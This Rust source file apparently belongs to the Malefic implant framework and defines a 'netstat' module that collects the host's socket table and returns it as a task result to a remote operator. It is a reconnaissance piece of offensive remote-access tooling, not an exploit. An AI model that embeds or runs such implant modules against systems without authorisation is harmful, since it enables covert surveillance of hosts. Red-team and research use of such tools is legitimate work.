use crate::{check_request, Module, ModuleImpl, Result, TaskResult};
use malefic_proto::proto::implantpb::{spite::Body};
use async_trait::async_trait;
use malefic_proto::proto::modulepb::{NetstatResponse, SockTabEntry};
use malefic_trait::module_impl;

pub struct Netstat {}


#[async_trait]
#[module_impl("netstat")]
impl Module for Netstat {}

#[async_trait]
impl ModuleImpl for Netstat {
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, _sender: &mut crate::Output) -> Result {
        let _re = check_request!(receiver, Body::Request)?;

        let mut response = NetstatResponse::default();
        for sock in malefic_helper::common::net::get_netstat()?.into_iter(){
            response.socks.push(SockTabEntry{
                local_addr: sock.local_addr,
                remote_addr: sock.remote_addr,
                protocol: sock.protocol,
                pid: sock.pid,
                sk_state: sock.sk_state,
            });
        }

        Ok(TaskResult::new_with_body(id, Body::NetstatResponse(response))) // 响应体为空
    }
}